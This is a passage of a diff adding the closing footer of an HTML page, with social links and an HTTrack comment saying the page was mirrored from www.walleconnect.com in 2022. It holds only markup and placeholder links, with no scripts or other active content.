0-.68 1.16-2.448 1.216z" />
+                    </svg> Discord</a>
+            </div>
+            <div class="col-sm-4">
+                <a href=".html"><i class="fa fa-twitter fi1"></i> Twitter</a>
+            </div>
+            <div class="col-sm-4" style="padding-top: 5px;">
+                <a href=".html"><i class="fa fa-github fi1"></i> Github</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="col-sm-3"></div>
+</div>    </div>
+    <!--Footer Ends-->
+</body>
+
+
+<!-- Mirrored from www.walleconnect.com/ by HTTrack Website Copier/3.x [XR&CO'2017], Sat, 02 Jul 2022 03:18:53 GMT -->
+</html>
